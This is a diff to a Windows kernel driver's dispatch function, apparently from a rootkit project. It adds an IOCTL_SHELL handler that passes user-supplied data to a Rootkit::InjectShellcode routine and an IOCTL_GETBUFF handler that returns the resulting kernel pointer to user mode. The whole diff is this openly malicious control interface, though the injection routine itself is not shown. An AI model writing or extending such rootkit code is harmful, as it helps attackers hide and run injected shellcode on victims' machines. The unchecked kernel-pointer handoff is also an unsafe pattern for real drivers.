@@ -31,9 +31,12 @@ NTSTATUS Dispatch::DriverCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP
     return STATUS_SUCCESS;
 }
 
+PVOID buffer = { 0 };
+
 NTSTATUS Dispatch::DriverDispatch(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp)
 {
     NTSTATUS status = STATUS_SUCCESS;
+    ULONG bytesIO = 0;
     auto stack = IoGetCurrentIrpStackLocation(Irp);
 
     switch (stack->Parameters.DeviceIoControl.IoControlCode)
@@ -162,13 +165,33 @@ NTSTATUS Dispatch::DriverDispatch(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Ir
         break;
     }
 
+    case IOCTL_SHELL:
+    {
+        Shell* shell = (Shell*)Irp->AssociatedIrp.SystemBuffer;
+        buffer = Rootkit::InjectShellcode(shell);
+        bytesIO = sizeof(Shell);
+
+        break;
+    }
+
+
+    case IOCTL_GETBUFF:
+    {
+        PVOID* outBuffer = (PVOID*)Irp->AssociatedIrp.SystemBuffer;
+        *outBuffer = buffer;
+
+        status = STATUS_SUCCESS;
+        bytesIO = sizeof(*outBuffer);
+
+        break;
+    }
     default:
         status = STATUS_INVALID_DEVICE_REQUEST;
         break;
     }
 
     Irp->IoStatus.Status = status;
-    Irp->IoStatus.Information = 0;
+    Irp->IoStatus.Information = bytesIO;
     IoCompleteRequest(Irp, IO_NO_INCREMENT);
     return status;
 }
